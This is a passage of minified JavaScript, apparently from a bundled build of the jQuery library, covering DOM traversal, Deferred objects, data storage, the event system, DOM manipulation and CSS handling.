this.pushStack(a(this,t||[],!0))},is:function(t){return!!a(this,"string"==typeof t&&Ot.test(t)?Tt(t):t||[],!1).length}});var It,Nt=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(Tt.fn.init=function(t,e,n){var i,o;if(!t)return this;if(n=n||It,"string"==typeof t){if(!(i="<"===t[0]&&">"===t[t.length-1]&&t.length>=3?[null,t,null]:Nt.exec(t))||!i[1]&&e)return!e||e.jquery?(e||n).find(t):this.constructor(e).find(t);if(i[1]){if(e=e instanceof Tt?e[0]:e,Tt.merge(this,Tt.parseHTML(i[1],e&&e.nodeType?e.ownerDocument||e:xt,!0)),Bt.test(i[1])&&Tt.isPlainObject(e))for(i in e)yt(this[i])?this[i](e[i]):this.attr(i,e[i]);return this}return(o=xt.getElementById(i[2]))&&(this[0]=o,this.length=1),this}return t.nodeType?(this[0]=t,this.length=1,this):yt(t)?void 0!==n.ready?n.ready(t):t(Tt):Tt.makeArray(t,this)}).prototype=Tt.fn,It=Tt(xt);var Rt=/^(?:parents|prev(?:Until|All))/,Ht={children:!0,contents:!0,next:!0,prev:!0};Tt.fn.extend({has:function(t){var e=Tt(t,this),n=e.length;return this.filter((function(){for(var t=0;t<n;t++)if(Tt.contains(this,e[t]))return!0}))},closest:function(t,e){var n,i=0,o=this.length,r=[],s="string"!=typeof t&&Tt(t);if(!Ot.test(t))for(;i<o;i++)for(n=this[i];n&&n!==e;n=n.parentNode)if(n.nodeType<11&&(s?s.index(n)>-1:1===n.nodeType&&Tt.find.matchesSelector(n,t))){r.push(n);break}return this.pushStack(r.length>1?Tt.uniqueSort(r):r)},index:function(t){return t?"string"==typeof t?ht.call(Tt(t),this[0]):ht.call(this,t.jquery?t[0]:t):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(t,e){return this.pushStack(Tt.uniqueSort(Tt.merge(this.get(),Tt(t,e))))},addBack:function(t){return this.add(null==t?this.prevObject:this.prevObject.filter(t))}}),Tt.each({parent:function(t){var e=t.parentNode;return e&&11!==e.nodeType?e:null},parents:function(t){return Pt(t,"parentNode")},parentsUntil:function(t,e,n){return Pt(t,"parentNode",n)},next:function(t){return l(t,"nextSibling")},prev:function(t){return l(t,"previousSibling")},nextAll:function(t){return Pt(t,"nextSibling")},prevAll:function(t){return Pt(t,"previousSibling")},nextUntil:function(t,e,n){return Pt(t,"nextSibling",n)},prevUntil:function(t,e,n){return Pt(t,"previousSibling",n)},siblings:function(t){return $t((t.parentNode||{}).firstChild,t)},children:function(t){return $t(t.firstChild)},contents:function(t){return null!=t.contentDocument&&at(t.contentDocument)?t.contentDocument:(r(t,"template")&&(t=t.content||t),Tt.merge([],t.childNodes))}},(function(t,e){Tt.fn[t]=function(n,i){var o=Tt.map(this,e,n);return"Until"!==t.slice(-5)&&(i=n),i&&"string"==typeof i&&(o=Tt.filter(i,o)),this.length>1&&(Ht[t]||Tt.uniqueSort(o),Rt.test(t)&&o.reverse()),this.pushStack(o)}}));var qt=/[^\x20\t\r\n\f]+/g;Tt.Callbacks=function(t){t="string"==typeof t?function c(t){var e={};return Tt.each(t.match(qt)||[],(function(t,n){e[n]=!0})),e}(t):Tt.extend({},t);var e,n,o,r,s=[],a=[],l=-1,u=function(){for(r=r||t.once,o=e=!0;a.length;l=-1)for(n=a.shift();++l<s.length;)!1===s[l].apply(n[0],n[1])&&t.stopOnFalse&&(l=s.length,n=!1);t.memory||(n=!1),e=!1,r&&(s=n?[]:"")},h={add:function(){return s&&(n&&!e&&(l=s.length-1,a.push(n)),function o(e){Tt.each(e,(function(e,n){yt(n)?t.unique&&h.has(n)||s.push(n):n&&n.length&&"string"!==i(n)&&o(n)}))}(arguments),n&&!e&&u()),this},remove:function(){return Tt.each(arguments,(function(t,e){for(var n;(n=Tt.inArray(e,s,n))>-1;)s.splice(n,1),n<=l&&l--})),this},has:function(t){return t?Tt.inArray(t,s)>-1:s.length>0},empty:function(){return s&&(s=[]),this},disable:function(){return r=a=[],s=n="",this},disabled:function(){return!s},lock:function(){return r=a=[],n||e||(s=n=""),this},locked:function(){return!!r},fireWith:function(t,n){return r||(n=[t,(n=n||[]).slice?n.slice():n],a.push(n),e||u()),this},fire:function(){return h.fireWith(this,arguments),this},fired:function(){return!!o}};return h},Tt.extend({Deferred:function(e){var n=[["notify","progress",Tt.Callbacks("memory"),Tt.Callbacks("memory"),2],["resolve","done",Tt.Callbacks("once memory"),Tt.Callbacks("once memory"),0,"resolved"],["reject","fail",Tt.Callbacks("once memory"),Tt.Callbacks("once memory"),1,"rejected"]],i="pending",o={state:function(){return i},always:function(){return r.done(arguments).fail(arguments),this},catch:function(t){return o.then(null,t)},pipe:function(){var t=arguments;return Tt.Deferred((function(e){Tt.each(n,(function(n,i){var o=yt(t[i[4]])&&t[i[4]];r[i[1]]((function(){var t=o&&o.apply(this,arguments);t&&yt(t.promise)?t.promise().progress(e.notify).done(e.resolve).fail(e.reject):e[i[0]+"With"](this,o?[t]:arguments)}))})),t=null})).promise()},then:function(e,i,o){function r(e,n,i,o){return function(){var a=this,l=arguments,c=function(){var t,c;if(!(e<s)){if((t=i.apply(a,l))===n.promise())throw new TypeError("Thenable self-resolution");c=t&&("object"==typeof t||"function"==typeof t)&&t.then,yt(c)?o?c.call(t,r(s,n,u,o),r(s,n,h,o)):(s++,c.call(t,r(s,n,u,o),r(s,n,h,o),r(s,n,u,n.notifyWith))):(i!==u&&(a=void 0,l=[t]),(o||n.resolveWith)(a,l))}},d=o?c:function(){try{c()}catch(t){Tt.Deferred.exceptionHook&&Tt.Deferred.exceptionHook(t,d.error),e+1>=s&&(i!==h&&(a=void 0,l=[t]),n.rejectWith(a,l))}};e?d():(Tt.Deferred.getErrorHook?d.error=Tt.Deferred.getErrorHook():Tt.Deferred.getStackHook&&(d.error=Tt.Deferred.getStackHook()),t.setTimeout(d))}}var s=0;return Tt.Deferred((function(t){n[0][3].add(r(0,t,yt(o)?o:u,t.notifyWith)),n[1][3].add(r(0,t,yt(e)?e:u)),n[2][3].add(r(0,t,yt(i)?i:h))})).promise()},promise:function(t){return null!=t?Tt.extend(t,o):o}},r={};return Tt.each(n,(function(t,e){var s=e[2],a=e[5];o[e[1]]=s.add,a&&s.add((function(){i=a}),n[3-t][2].disable,n[3-t][3].disable,n[0][2].lock,n[0][3].lock),s.add(e[3].fire),r[e[0]]=function(){return r[e[0]+"With"](this===r?void 0:this,arguments),this},r[e[0]+"With"]=s.fireWith})),o.promise(r),e&&e.call(r,r),r},when:function(t){var e=arguments.length,n=e,i=Array(n),o=lt.call(arguments),r=Tt.Deferred(),s=function(t){return function(n){i[t]=this,o[t]=arguments.length>1?lt.call(arguments):n,--e||r.resolveWith(i,o)}};if(e<=1&&(d(t,r.done(s(n)).resolve,r.reject,!e),"pending"===r.state()||yt(o[n]&&o[n].then)))return r.then();for(;n--;)d(o[n],s(n),r.reject);return r.promise()}});var Ft=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;Tt.Deferred.exceptionHook=function(e,n){t.console&&t.console.warn&&e&&Ft.test(e.name)&&t.console.warn("jQuery.Deferred exception: "+e.message,e.stack,n)},Tt.readyException=function(e){t.setTimeout((function(){throw e}))};var Wt=Tt.Deferred();Tt.fn.ready=function(t){return Wt.then(t).catch((function(t){Tt.readyException(t)})),this},Tt.extend({isReady:!1,readyWait:1,ready:function(t){(!0===t?--Tt.readyWait:Tt.isReady)||(Tt.isReady=!0,!0!==t&&--Tt.readyWait>0||Wt.resolveWith(xt,[Tt]))}}),Tt.ready.then=Wt.then,"complete"===xt.readyState||"loading"!==xt.readyState&&!xt.documentElement.doScroll?t.setTimeout(Tt.ready):(xt.addEventListener("DOMContentLoaded",p),t.addEventListener("load",p));var zt=function(t,e,n,o,r,s,a){var l=0,c=t.length,u=null==n;if("object"===i(n))for(l in r=!0,n)zt(t,e,l,n[l],!0,s,a);else if(void 0!==o&&(r=!0,yt(o)||(a=!0),u&&(a?(e.call(t,o),e=null):(u=e,e=function(t,e,n){return u.call(Tt(t),n)})),e))for(;l<c;l++)e(t[l],n,a?o:o.call(t[l],l,e(t[l],n)));return r?t:u?e.call(t):c?e(t[0],n):s},Vt=/^-ms-/,Ut=/-([a-z])/g,Xt=function(t){return 1===t.nodeType||9===t.nodeType||!+t.nodeType};g.uid=1,g.prototype={cache:function(t){var e=t[this.expando];return e||(e={},Xt(t)&&(t.nodeType?t[this.expando]=e:Object.defineProperty(t,this.expando,{value:e,configurable:!0}))),e},set:function(t,e,n){var i,o=this.cache(t);if("string"==typeof e)o[m(e)]=n;else for(i in e)o[m(i)]=e[i];return o},get:function(t,e){return void 0===e?this.cache(t):t[this.expando]&&t[this.expando][m(e)]},access:function(t,e,n){return void 0===e||e&&"string"==typeof e&&void 0===n?this.get(t,e):(this.set(t,e,n),void 0!==n?n:e)},remove:function(t,e){var n,i=t[this.expando];if(void 0!==i){if(void 0!==e){n=(e=Array.isArray(e)?e.map(m):(e=m(e))in i?[e]:e.match(qt)||[]).length;for(;n--;)delete i[e[n]]}(void 0===e||Tt.isEmptyObject(i))&&(t.nodeType?t[this.expando]=void 0:delete t[this.expando])}},hasData:function(t){var e=t[this.expando];return void 0!==e&&!Tt.isEmptyObject(e)}};var Yt=new g,Qt=new g,Kt=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,Gt=/[A-Z]/g;Tt.extend({hasData:function(t){return Qt.hasData(t)||Yt.hasData(t)},data:function(t,e,n){return Qt.access(t,e,n)},removeData:function(t,e){Qt.remove(t,e)},_data:function(t,e,n){return Yt.access(t,e,n)},_removeData:function(t,e){Yt.remove(t,e)}}),Tt.fn.extend({data:function(t,e){var n,i,o,r=this[0],s=r&&r.attributes;if(void 0===t){if(this.length&&(o=Qt.get(r),1===r.nodeType&&!Yt.get(r,"hasDataAttrs"))){for(n=s.length;n--;)s[n]&&0===(i=s[n].name).indexOf("data-")&&(i=m(i.slice(5)),y(r,i,o[i]));Yt.set(r,"hasDataAttrs",!0)}return o}return"object"==typeof t?this.each((function(){Qt.set(this,t)})):zt(this,(function(e){var n;if(r&&void 0===e)return void 0!==(n=Qt.get(r,t))||void 0!==(n=y(r,t))?n:void 0;this.each((function(){Qt.set(this,t,e)}))}),null,e,arguments.length>1,null,!0)},removeData:function(t){return this.each((function(){Qt.remove(this,t)}))}}),Tt.extend({queue:function(t,e,n){var i;if(t)return e=(e||"fx")+"queue",i=Yt.get(t,e),n&&(!i||Array.isArray(n)?i=Yt.access(t,e,Tt.makeArray(n)):i.push(n)),i||[]},dequeue:function(t,e){e=e||"fx";var n=Tt.queue(t,e),i=n.length,o=n.shift(),r=Tt._queueHooks(t,e);"inprogress"===o&&(o=n.shift(),i--),o&&("fx"===e&&n.unshift("inprogress"),delete r.stop,o.call(t,(function(){Tt.dequeue(t,e)}),r)),!i&&r&&r.empty.fire()},_queueHooks:function(t,e){var n=e+"queueHooks";return Yt.get(t,n)||Yt.access(t,n,{empty:Tt.Callbacks("once memory").add((function(){Yt.remove(t,[e+"queue",n])}))})}}),Tt.fn.extend({queue:function(t,e){var n=2;return"string"!=typeof t&&(e=t,t="fx",n--),arguments.length<n?Tt.queue(this[0],t):void 0===e?this:this.each((function(){var n=Tt.queue(this,t,e);Tt._queueHooks(this,t),"fx"===t&&"inprogress"!==n[0]&&Tt.dequeue(this,t)}))},dequeue:function(t){return this.each((function(){Tt.dequeue(this,t)}))},clearQueue:function(t){return this.queue(t||"fx",[])},promise:function(t,e){var n,i=1,o=Tt.Deferred(),r=this,s=this.length,a=function(){--i||o.resolveWith(r,[r])};for("string"!=typeof t&&(e=t,t=void 0),t=t||"fx";s--;)(n=Yt.get(r[s],t+"queueHooks"))&&n.empty&&(i++,n.empty.add(a));return a(),o.promise(e)}});var Zt=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,Jt=new RegExp("^(?:([+-])=|)("+Zt+")([a-z%]*)$","i"),te=["Top","Right","Bottom","Left"],ee=xt.documentElement,ne=function(t){return Tt.contains(t.ownerDocument,t)},ie={composed:!0};ee.getRootNode&&(ne=function(t){return Tt.contains(t.ownerDocument,t)||t.getRootNode(ie)===t.ownerDocument});var oe=function(t,e){return"none"===(t=e||t).style.display||""===t.style.display&&ne(t)&&"none"===Tt.css(t,"display")},re={};Tt.fn.extend({show:function(){return w(this,!0)},hide:function(){return w(this)},toggle:function(t){return"boolean"==typeof t?t?this.show():this.hide():this.each((function(){oe(this)?Tt(this).show():Tt(this).hide()}))}});var se,ae,le=/^(?:checkbox|radio)$/i,ce=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,ue=/^$|^module$|\/(?:java|ecma)script/i;se=xt.createDocumentFragment().appendChild(xt.createElement("div")),(ae=xt.createElement("input")).setAttribute("type","radio"),ae.setAttribute("checked","checked"),ae.setAttribute("name","t"),se.appendChild(ae),vt.checkClone=se.cloneNode(!0).cloneNode(!0).lastChild.checked,se.innerHTML="<textarea>x</textarea>",vt.noCloneChecked=!!se.cloneNode(!0).lastChild.defaultValue,se.innerHTML="<option></option>",vt.option=!!se.lastChild;var he={thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};he.tbody=he.tfoot=he.colgroup=he.caption=he.thead,he.th=he.td,vt.option||(he.optgroup=he.option=[1,"<select multiple='multiple'>","</select>"]);var de=/<|&#?\w+;/,pe=/^([^.]*)(?:\.(.+)|)/;Tt.event={global:{},add:function(t,e,n,i,o){var r,s,a,l,c,u,h,d,p,f,m,g=Yt.get(t);if(Xt(t))for(n.handler&&(n=(r=n).handler,o=r.selector),o&&Tt.find.matchesSelector(ee,o),n.guid||(n.guid=Tt.guid++),(l=g.events)||(l=g.events=Object.create(null)),(s=g.handle)||(s=g.handle=function(e){return void 0!==Tt&&Tt.event.triggered!==e.type?Tt.event.dispatch.apply(t,arguments):void 0}),c=(e=(e||"").match(qt)||[""]).length;c--;)p=m=(a=pe.exec(e[c])||[])[1],f=(a[2]||"").split(".").sort(),p&&(h=Tt.event.special[p]||{},p=(o?h.delegateType:h.bindType)||p,h=Tt.event.special[p]||{},u=Tt.extend({type:p,origType:m,data:i,handler:n,guid:n.guid,selector:o,needsContext:o&&Tt.expr.match.needsContext.test(o),namespace:f.join(".")},r),(d=l[p])||((d=l[p]=[]).delegateCount=0,h.setup&&!1!==h.setup.call(t,i,f,s)||t.addEventListener&&t.addEventListener(p,s)),h.add&&(h.add.call(t,u),u.handler.guid||(u.handler.guid=n.guid)),o?d.splice(d.delegateCount++,0,u):d.push(u),Tt.event.global[p]=!0)},remove:function(t,e,n,i,o){var r,s,a,l,c,u,h,d,p,f,m,g=Yt.hasData(t)&&Yt.get(t);if(g&&(l=g.events)){for(c=(e=(e||"").match(qt)||[""]).length;c--;)if(p=m=(a=pe.exec(e[c])||[])[1],f=(a[2]||"").split(".").sort(),p){for(h=Tt.event.special[p]||{},d=l[p=(i?h.delegateType:h.bindType)||p]||[],a=a[2]&&new RegExp("(^|\\.)"+f.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=r=d.length;r--;)u=d[r],!o&&m!==u.origType||n&&n.guid!==u.guid||a&&!a.test(u.namespace)||i&&i!==u.selector&&("**"!==i||!u.selector)||(d.splice(r,1),u.selector&&d.delegateCount--,h.remove&&h.remove.call(t,u));s&&!d.length&&(h.teardown&&!1!==h.teardown.call(t,f,g.handle)||Tt.removeEvent(t,p,g.handle),delete l[p])}else for(p in l)Tt.event.remove(t,p+e[c],n,i,!0);Tt.isEmptyObject(l)&&Yt.remove(t,"handle events")}},dispatch:function(t){var e,n,i,o,r,s,a=new Array(arguments.length),l=Tt.event.fix(t),c=(Yt.get(this,"events")||Object.create(null))[l.type]||[],u=Tt.event.special[l.type]||{};for(a[0]=l,e=1;e<arguments.length;e++)a[e]=arguments[e];if(l.delegateTarget=this,!u.preDispatch||!1!==u.preDispatch.call(this,l)){for(s=Tt.event.handlers.call(this,l,c),e=0;(o=s[e++])&&!l.isPropagationStopped();)for(l.currentTarget=o.elem,n=0;(r=o.handlers[n++])&&!l.isImmediatePropagationStopped();)l.rnamespace&&!1!==r.namespace&&!l.rnamespace.test(r.namespace)||(l.handleObj=r,l.data=r.data,void 0!==(i=((Tt.event.special[r.origType]||{}).handle||r.handler).apply(o.elem,a))&&!1===(l.result=i)&&(l.preventDefault(),l.stopPropagation()));return u.postDispatch&&u.postDispatch.call(this,l),l.result}},handlers:function(t,e){var n,i,o,r,s,a=[],l=e.delegateCount,c=t.target;if(l&&c.nodeType&&!("click"===t.type&&t.button>=1))for(;c!==this;c=c.parentNode||this)if(1===c.nodeType&&("click"!==t.type||!0!==c.disabled)){for(r=[],s={},n=0;n<l;n++)void 0===s[o=(i=e[n]).selector+" "]&&(s[o]=i.needsContext?Tt(o,this).index(c)>-1:Tt.find(o,this,null,[c]).length),s[o]&&r.push(i);r.length&&a.push({elem:c,handlers:r})}return c=this,l<e.length&&a.push({elem:c,handlers:e.slice(l)}),a},addProp:function(t,e){Object.defineProperty(Tt.Event.prototype,t,{enumerable:!0,configurable:!0,get:yt(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[t]},set:function(e){Object.defineProperty(this,t,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(t){return t[Tt.expando]?t:new Tt.Event(t)},special:{load:{noBubble:!0},click:{setup:function(t){var e=this||t;return le.test(e.type)&&e.click&&r(e,"input")&&j(e,"click",!0),!1},trigger:function(t){var e=this||t;return le.test(e.type)&&e.click&&r(e,"input")&&j(e,"click"),!0},_default:function(t){var e=t.target;return le.test(e.type)&&e.click&&r(e,"input")&&Yt.get(e,"click")||r(e,"a")}},beforeunload:{postDispatch:function(t){void 0!==t.result&&t.originalEvent&&(t.originalEvent.returnValue=t.result)}}}},Tt.removeEvent=function(t,e,n){t.removeEventListener&&t.removeEventListener(e,n)},Tt.Event=function(t,e){if(!(this instanceof Tt.Event))return new Tt.Event(t,e);t&&t.type?(this.originalEvent=t,this.type=t.type,this.isDefaultPrevented=t.defaultPrevented||void 0===t.defaultPrevented&&!1===t.returnValue?C:S,this.target=t.target&&3===t.target.nodeType?t.target.parentNode:t.target,this.currentTarget=t.currentTarget,this.relatedTarget=t.relatedTarget):this.type=t,e&&Tt.extend(this,e),this.timeStamp=t&&t.timeStamp||Date.now(),this[Tt.expando]=!0},Tt.Event.prototype={constructor:Tt.Event,isDefaultPrevented:S,isPropagationStopped:S,isImmediatePropagationStopped:S,isSimulated:!1,preventDefault:function(){var t=this.originalEvent;this.isDefaultPrevented=C,t&&!this.isSimulated&&t.preventDefault()},stopPropagation:function(){var t=this.originalEvent;this.isPropagationStopped=C,t&&!this.isSimulated&&t.stopPropagation()},stopImmediatePropagation:function(){var t=this.originalEvent;this.isImmediatePropagationStopped=C,t&&!this.isSimulated&&t.stopImmediatePropagation(),this.stopPropagation()}},Tt.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,char:!0,code:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:!0},Tt.event.addProp),Tt.each({focus:"focusin",blur:"focusout"},(function(t,e){function n(t){if(xt.documentMode){var n=Yt.get(this,"handle"),i=Tt.event.fix(t);i.type="focusin"===t.type?"focus":"blur",i.isSimulated=!0,n(t),i.target===i.currentTarget&&n(i)}else Tt.event.simulate(e,t.target,Tt.event.fix(t))}Tt.event.special[t]={setup:function(){var i;if(j(this,t,!0),!xt.documentMode)return!1;(i=Yt.get(this,e))||this.addEventListener(e,n),Yt.set(this,e,(i||0)+1)},trigger:function(){return j(this,t),!0},teardown:function(){var t;if(!xt.documentMode)return!1;(t=Yt.get(this,e)-1)?Yt.set(this,e,t):(this.removeEventListener(e,n),Yt.remove(this,e))},_default:function(e){return Yt.get(e.target,t)},delegateType:e},Tt.event.special[e]={setup:function(){var i=this.ownerDocument||this.document||this,o=xt.documentMode?this:i,r=Yt.get(o,e);r||(xt.documentMode?this.addEventListener(e,n):i.addEventListener(t,n,!0)),Yt.set(o,e,(r||0)+1)},teardown:function(){var i=this.ownerDocument||this.document||this,o=xt.documentMode?this:i,r=Yt.get(o,e)-1;r?Yt.set(o,e,r):(xt.documentMode?this.removeEventListener(e,n):i.removeEventListener(t,n,!0),Yt.remove(o,e))}}})),Tt.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},(function(t,e){Tt.event.special[t]={delegateType:e,bindType:e,handle:function(t){var n,o=t.relatedTarget,r=t.handleObj;return o&&(o===this||Tt.contains(this,o))||(t.type=r.origType,n=r.handler.apply(this,arguments),t.type=e),n}}})),Tt.fn.extend({on:function(t,e,n,i){return E(this,t,e,n,i)},one:function(t,e,n,i){return E(this,t,e,n,i,1)},off:function(t,e,n){var i,o;if(t&&t.preventDefault&&t.handleObj)return i=t.handleObj,Tt(t.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof t){for(o in t)this.off(o,e,t[o]);return this}return!1!==e&&"function"!=typeof e||(n=e,e=void 0),!1===n&&(n=S),this.each((function(){Tt.event.remove(this,t,n,e)}))}});var fe=/<script|<style|<link/i,me=/checked\s*(?:[^=]|=\s*.checked.)/i,ge=/^\s*<!\[CDATA\[|\]\]>\s*$/g;Tt.extend({htmlPrefilter:function(t){return t},clone:function(t,e,n){var i,o,r,s,a=t.cloneNode(!0),l=ne(t);if(!(vt.noCloneChecked||1!==t.nodeType&&11!==t.nodeType||Tt.isXMLDoc(t)))for(s=_(a),i=0,o=(r=_(t)).length;i<o;i++)P(r[i],s[i]);if(e)if(n)for(r=r||_(t),s=s||_(a),i=0,o=r.length;i<o;i++)L(r[i],s[i]);else L(t,a);return(s=_(a,"script")).length>0&&k(s,!l&&_(t,"script")),a},cleanData:function(t){for(var e,n,i,o=Tt.event.special,r=0;void 0!==(n=t[r]);r++)if(Xt(n)){if(e=n[Yt.expando]){if(e.events)for(i in e.events)o[i]?Tt.event.remove(n,i):Tt.removeEvent(n,i,e.handle);n[Yt.expando]=void 0}n[Qt.expando]&&(n[Qt.expando]=void 0)}}}),Tt.fn.extend({detach:function(t){return O(this,t,!0)},remove:function(t){return O(this,t)},text:function(t){return zt(this,(function(t){return void 0===t?Tt.text(this):this.empty().each((function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=t)}))}),null,t,arguments.length)},append:function(){return $(this,arguments,(function(t){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||A(this,t).appendChild(t)}))},prepend:function(){return $(this,arguments,(function(t){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var e=A(this,t);e.insertBefore(t,e.firstChild)}}))},before:function(){return $(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this)}))},after:function(){return $(this,arguments,(function(t){this.parentNode&&this.parentNode.insertBefore(t,this.nextSibling)}))},empty:function(){for(var t,e=0;null!=(t=this[e]);e++)1===t.nodeType&&(Tt.cleanData(_(t,!1)),t.textContent="");return this},clone:function(t,e){return t=null!=t&&t,e=null==e?t:e,this.map((function(){return Tt.clone(this,t,e)}))},html:function(t){return zt(this,(function(t){var e=this[0]||{},n=0,i=this.length;if(void 0===t&&1===e.nodeType)return e.innerHTML;if("string"==typeof t&&!fe.test(t)&&!he[(ce.exec(t)||["",""])[1].toLowerCase()]){t=Tt.htmlPrefilter(t);try{for(;n<i;n++)1===(e=this[n]||{}).nodeType&&(Tt.cleanData(_(e,!1)),e.innerHTML=t);e=0}catch(o){}}e&&this.empty().append(t)}),null,t,arguments.length)},replaceWith:function(){var t=[];return $(this,arguments,(function(e){var n=this.parentNode;Tt.inArray(this,t)<0&&(Tt.cleanData(_(this)),n&&n.replaceChild(e,this))}),t)}}),Tt.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},(function(t,e){Tt.fn[t]=function(t){for(var n,i=[],o=Tt(t),r=o.length-1,s=0;s<=r;s++)n=s===r?this:this.clone(!0),Tt(o[s])[e](n),ut.apply(i,n.get());return this.pushStack(i)}}));var ve=new RegExp("^("+Zt+")(?!px)[a-z%]+$","i"),ye=/^--/,be=function(e){var n=e.ownerDocument.defaultView;return n&&n.opener||(n=t),n.getComputedStyle(e)},xe=function(t,e,n){var i,o,r={};for(o in e)r[o]=t.style[o],t.style[o]=e[o];for(o in i=n.call(t),e)t.style[o]=r[o];return i},we=new RegExp(te.join("|"),"i");!function(){function e(){if(u){c.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",u.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",ee.appendChild(c).appendChild(u);var e=t.getComputedStyle(u);i="1%"!==e.top,l=12===n(e.marginLeft),u.style.right="60%",s=36===n(e.right),o=36===n(e.width),u.style.position="absolute",r=12===n(u.offsetWidth/3),ee.removeChild(c),u=null}}function n(t){return Math.round(parseFloat(t))}var i,o,r,s,a,l,c=xt.createElement("div"),u=xt.createElement("div");u.style&&(u.style.backgroundClip="content-box",u.cloneNode(!0).style.backgroundClip="",vt.clearCloneStyle="content-box"===u.style.backgroundClip,Tt.extend(vt,{boxSizingReliable:function(){return e(),o},pixelBoxStyles:function(){return e(),s},pixelPosition:function(){return e(),i},reliableMarginLeft:function(){return e(),l},scrollboxSize:function(){return e(),r},reliableTrDimensions:function(){var e,n,i,o;return null==a&&(e=xt.createElement("table"),n=xt.createElement("tr"),i=xt.createElement("div"),e.style.cssText="position:absolute;left:-11111px;border-collapse:separate",n.style.cssText="border:1px solid",n.style.height="1px",i.style.height="9px",i.style.display="block",ee.appendChild(e).appendChild(n).appendChild(i),o=t.getComputedStyle(n),a=parseInt(o.height,10)+parseInt(o.borderTopWidth,10)+parseInt(o.borderBottomWidth,10)===n.offsetHeight,ee.removeChild(e)),a}}))}();var _e=["Webkit","Moz","ms"],ke=xt.createElement("div").style,Te={},Ce=/^(none|table(?!-c[ea]).+)/,Se={position:"absolute",visibility:"hidden",display:"block"},Ee={letterSpacing:"0",fontWeight:"400"};Tt.extend({cssHooks:{opacity:{get:function(t,e){if(e){var n=B(t,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,aspectRatio:!0,borderImageSlice:!0,columnCount:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,scale:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeMiterlimit:!0,strokeOpacity:!0},cssProps:{},style:function(t,e,n,i){if(t&&3!==t.nodeType&&8!==t.nodeType&&t.style){var o,r,s,a=m(e),l=ye.test(e),c=t.style;if(l||(e=R(a)),s=Tt.cssHooks[e]||Tt.cssHooks[a],void 0===n)return s&&"get"in s&&void 0!==(o=s.get(t,!1,i))?o:c[e];"string"==(r=typeof n)&&(o=Jt.exec(n))&&o[1]&&(n=b(t,e,o),r="number"),null!=n&&n==n&&("number"!==r||l||(n+=o&&o[3]||(Tt.cssNumber[a]?"":"px")),vt.clearCloneStyle||""!==n||0!==e.indexOf("background")||(c[e]="inherit"),s&&"set"in s&&void 0===(n=s.set(t,n,i))||(l?c.setProperty(e,n):c[e]=n))}},css:function(t,e,n,i){var o,r,s,a=m(e);return ye.test(e)||(e=R(a)),(s=Tt.cssHooks[e]||Tt.cssHooks[a])&&"get"in s&&(o=s.get(t,!0,n)),void 0===o&&(o=B(t,e,i)),"normal"===o&&e in Ee&&(o=Ee[e]),""===n||n?(r=parseFloat(o),!0===n||isFinite(r)?r||0:o):o}}),Tt.each(["height","width"],(function(t,e){Tt.cssHooks[e]={get:function(t,n,i){if(n)return!Ce.test(Tt.css(t,"display"))||t.getClientRects().length&&t.getBoundingClientRect().width?F(t,e,i):xe(t,Se,(function(){return F(t,e,i)}))},set:function(t,n,i){var o,r=be(t),s=!vt.scrollboxSize()&&"absolute"===r.position,a=(s||i)&&"border-box"===Tt.css(t,"boxSizing",!1,r),l=i?q(t,e,i,a,r):0;return a&&s&&(l-=Math.ceil(t["offset"+e[0].toUpperCase()+e.slice(1)]-parseFloat(r[e])-q(t,e,"border",!1,r)-.5)),l&&(o=Jt.exec(n))&&"px"!==(o[3]||"px")&&(t.style[e]=n,n=Tt.css(t,e)),H(0,n,l)}}})),Tt.cssHooks.marginLeft=I(vt.reliableMarginLeft,(function(t,e){if(e)return(parseFloat(B(t,"marginLeft"))||t.getBoundingClientRect().left-xe(t,{marginLeft:0},(function(){return t.getBoundingClientRect().left})))+"px"})),Tt.each({margin:"",padding:"",border:"Width"},(function(t,e){Tt.cssHooks[t+e]={expand:function(n){for(var i=0,o={},r="string"==typeof n?n.split(" "):[n];i<4;i++)o[t+te[i]+e]=r[i]||r[i-2]||r[0];return o}},"margin"!==t&&(Tt.cssHooks[t+e].set=H)})),Tt.fn.extend({css:function(t,e){return zt(this,(function(t,e,n){var i,o,r={},s=0;if(Array.isArray(e)){for(i=be(t),o=e.length;s<o;s++)r[e[s]]=Tt.css(t,e[s],!1,i);return r}return void 